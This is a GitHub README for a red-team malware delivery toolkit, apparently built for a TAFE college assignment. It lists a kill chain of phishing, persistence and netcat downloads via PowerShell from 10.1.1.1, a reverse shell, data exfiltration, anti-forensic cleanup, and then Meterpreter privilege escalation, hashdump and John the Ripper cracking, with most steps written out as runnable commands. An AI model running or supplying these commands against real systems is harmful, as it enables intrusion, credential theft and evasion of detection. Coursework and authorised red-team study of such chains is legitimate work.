# THANATOS_77
![DALL·E 2023-05-08 18 37 02 - A glitch art knife ](https://user-images.githubusercontent.com/111553838/236778209-067c7d06-df52-4e1e-8683-e4ab827cc76b.png)

TRITIUM CYBER DEFENCE © All Rights Reserved 2023 

HTTP and malware delivery system for tafe assignment 

# PURPOSE

Provide a way for our team to serve files, extract data, and export data 
to create reports for our final assesment on a red team engagemnt. 

# SIMPLI X KILL CHAIN 

1. Recon and sniffing 
2. Configuring payloads  
3. get credentials from phishing a confidential document (enter password to open) 
4. use credentials to download and launch a netcat listener 
5. open a reverse shell and use the scp protocol to exfiltrate data 
6. Launch a cleaner program, DOS test 
7. Reboot to clear RAM 
All steps are sub 15 minutes total.  

# INSTALL 
## Clone the repo, allow config yada yada 

# CONFIG 
config here: should be handled by scripts 

# MANIFEST FOR TAFE ASSIGNMENT 

-Run msfstarter.py

-Run an appropriate flask program (Suggested is FLASK_25.py

-Target downloads document from generator from phishing

-All of the scripts require testing and configuration to verify the flask structure for get requests etc 

-In msf console commands: 

```
powershell -c "Invoke-WebRequest -Uri 'http://10.1.1.1:8080/persistence.bat' -OutFile 'persistence.bat'"
powershell -c "Invoke-WebRequest -Uri 'http://10.1.1.1:8080/nc.bin' -OutFile 'nc.exe'"
```

-Start netcat listner in kali 

``` 
nc -lvp 8339
```

-Go back to msf console and run following to start netcat shells and persistance 

```
nc.exe 10.1.1.1 8339 -e
```

-Metasploit privalage escalation V1: 
    In msf console try: 
    
```
meterpreter > getsystem
```

If successful you will have system access, if not:
Simultaneously perform the following and the manual steps below: 

```
meterpreter > hashdump 
meterpreter > hashdump > hashes.txt
john --format=NT hashes.txt
```
In another shell run to crack with wordlist: 

```
john --format=NT --wordlist= PATH TO WORDLIST HERE/.txt hashes.txt
```
A default wordlist for the tafe assignment is provided in the uploads directory. 

MANUALLY PERFORMING TASKS INCASE OF PYTHON AUTOMATION FALIURE. 
*****Replace <session_id> with the ID of your Meterpreter session.***

```
meterpreter > sysinfo 
meterpreter > background 
msf > use post/multi/recon/local_exploit_suggester
msf post(local_exploit_suggester) > set SESSION <session_id>
msf post(local_exploit_suggester) > set SHOWDESCRIPTION true
msf post(local_exploit_suggester) > run
```

From the list of suggested exploits, choose an appropriate one based on the target system's architecture and vulnerability. 

Set up and run the chosen exploit:

bash:
```
msf > use <exploit_name>
msf exploit(<exploit_name>) > set SESSION <session_id>
msf exploit(<exploit_name>) > set payload windows/meterpreter/reverse_tcp
msf exploit(<exploit_name>) > set LHOST <your_kali_ip>
msf exploit(<exploit_name>) > set LPORT <your_listener_port>
msf exploit(<exploit_name>) > exploit
```
If the exploit is successful, you should have a new Meterpreter session with administrator privileges. Use the hashdump command to dump the password hashes from the system:


## No warranty: 
Specific networked infrastructure for automating an attack. 
    Copyright (C) <2023>  <Anthony Grace and his team from Tafe>

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
